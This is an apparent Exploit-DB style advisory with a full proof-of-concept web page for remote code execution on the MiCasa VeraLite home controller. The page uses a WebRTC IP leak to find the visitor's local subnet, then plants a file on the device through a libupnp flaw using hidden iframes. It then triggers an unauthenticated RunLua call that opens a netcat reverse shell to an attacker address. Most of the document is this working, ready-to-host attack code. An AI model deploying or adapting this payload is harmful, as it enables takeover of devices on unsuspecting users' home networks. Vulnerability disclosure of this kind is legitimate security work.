# Exploit Title: MiCasa VeraLite Remote Code Execution
# Date: 10-20-2016
# Software Link: http://getvera.com/controllers/veralite/
# Exploit Author: Jacob Baines
# Contact: https://twitter.com/Junior_Baines
# CVE: CVE-2013-4863 & CVE-2016-6255
# Platform: Hardware

1. Description

A remote attacker can execute code on the MiCasa VeraLite if someone on the same LAN as the VeraLite visits a crafted webpage.

2. Proof of Concept

<!--
    @about
    This file, when loaded in a browser, will attempt to get a reverse shell
    on a VeraLite device on the client's network. This is achieved with the
    following steps:

    1. Acquire the client's internal IP address using webrtc. We then assume the
       client is operating on a \24 network.
    2. POST :49451/z3n.html to every address on the subnet. This leverages two
       things we know to be true about VeraLite:
           - there should be a UPnP HTTP server on 49451
           - VeraLite uses a libupnp vulnerable to CVE-2016-6255.
    3. Attempt to load :49451/z3n.html in an iframe. This will exist if step 2
       successfully created the file via CVE-2016-6255
    4. z3n.html will allow us to bypass same origin policy and it will make a
       POST request that executes RunLau. This also leverages information we
       know to be true about Veralite:
           - the control URL for HomeAutomationGateway is /upnp/control/hag
           - no auth required
    5. Our RunLua code executes a reverse shell to 192.168.217:1270.

    @note
    This code doesn't run fast in Firefox. This appears to largely be a performance
    issue associated with attaching a lot of iframes to a page. Give the shell
    popping a couple of minutes. In Chrome, it runs pretty fast but might
    exhaust socket usage.

    @citations
    - WebRTC IP leak: https://github.com/diafygi/webrtc-ips
    - Orignal RunLua Disclosure: https://media.blackhat.com/us-13/US-13-Crowley-Home-Invasion-2-0-WP.pdf
    - CVE-2016-6255: http://seclists.org/oss-sec/2016/q3/102
-->
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <script>
            /**
             * POSTS a page to ip:49451/z3n.html. If the target is a vulnerable
             * libupnp then the page will be written. Once the request has
             * completed, we attempt to load it in an iframe in order to bypass
             * same origin policy. If the page is loaded into the iframe then
             * it will make a soap action request with the action RunLua. The 
             * Lua code will execute a reverse shell.
             * @param ip the ip address to request to
             * @param frame_id the id of the iframe to create
             */
            function create_page(ip, frame_id)
            {
                payload = "<!DOCTYPE html>\n" +
                          "<html>\n" +
                            "<head>\n" +
                                "<title>Try To See It Once My Way</title>\n" +
                                "<script>\n" +
                                    "function exec_lua() {\n" +
                                        "soap_request = \"<s:Envelope s:encodingStyle=\\\"http://schemas.xmlsoap.org/soap/encoding/\\\" xmlns:s=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\">\";\n" +
                                        "soap_request += \"<s:Body>\";\n" +
                                        "soap_request += \"<u:RunLua xmlns:u=\\\"urn:schemas-micasaverde-org:service:HomeAutomationGateway:1\\\">\";\n" +
                                        "soap_request += \"<Code>os.execute("/bin/sh -c &apos;(mkfifo /tmp/a; cat /tmp/a | /bin/sh -i 2>&1 | nc 192.168.1.217 1270 > /tmp/a)&&apos;")</Code>\";\n" +
                                        "soap_request += \"</u:RunLua>\";\n" +
                                        "soap_request += \"</s:Body>\";\n" +
                                        "soap_request += \"</s:Envelope>\";\n" +

                                        "xhttp = new XMLHttpRequest();\n" +
                                        "xhttp.open(\"POST\", \"upnp/control/hag\", true);\n" +
                                        "xhttp.setRequestHeader(\"MIME-Version\", \"1.0\");\n" +
                                        "xhttp.setRequestHeader(\"Content-type\", \"text/xml;charset=\\\"utf-8\\\"\");\n" +
                                        "xhttp.setRequestHeader(\"Soapaction\", \"\\\"urn:schemas-micasaverde-org:service:HomeAutomationGateway:1#RunLua\\\"\");\n" +
                                        "xhttp.send(soap_request);\n" +
                                    "}\n" +
                                "</scr\ipt>\n" +
                            "</head>\n" +
                            "<body onload=\"exec_lua()\">\n" +
                            "Zen?\n" +
                            "</body>\n" +
                          "</html>";

                var xhttp = new XMLHttpRequest();
                xhttp.open("POST", "http://" + ip  + ":49451/z3n.html", true);
                xhttp.timeout = 1000;
                xhttp.onreadystatechange = function()
                {
                    if (xhttp.readyState == XMLHttpRequest.DONE)
                    {
                        new_iframe = document.createElement('iframe');
                        new_iframe.setAttribute("src", "http://" + ip + ":49451/z3n.html");
                        new_iframe.setAttribute("id", frame_id);
                        new_iframe.setAttribute("style", "width:0; height:0; border:0; border:none");
                        document.body.appendChild(new_iframe);
                    }
                };
                xhttp.send(payload);
            }

            /**
             * This function abuses the webrtc internal IP leak. This function
             * will find the the upper three bytes of network address and simply
             * assume that the client is on a \24 network.
             *
             * Once we have an ip range, we will attempt to create a page on a
             * vulnerable libupnp server via create_page().
             */
            function spray_and_pray()
            {
                RTCPeerConnection = window.RTCPeerConnection ||
                                    window.mozRTCPeerConnection ||
                                    window.webkitRTCPeerConnection;

                peerConn = new RTCPeerConnection({iceServers:[]});
                noop = function() { };

                peerConn.createDataChannel("");
                peerConn.createOffer(peerConn.setLocalDescription.bind(peerConn), noop);
                peerConn.onicecandidate = function(ice)
                {
                    if (!ice || !ice.candidate || !ice.candidate.candidate)
                    {
                        return;
                    }

                    clientNetwork = /([0-9]{1,3}(\.[0-9]{1,3}){2})/.exec(ice.candidate.candidate)[1];
                    peerConn.onicecandidate = noop;

                    if (clientNetwork && clientNetwork.length > 0)
                    {
                        for (i = 0; i < 255; i++)
                        {
                            create_page(clientNetwork + '.' + i, "page"+i);
                        }
                    }
                };
            }
        </script>
    </head>
    <body onload="spray_and_pray()">
    Everything zen.
    </body>
</html>

3. Solution:

No solution exists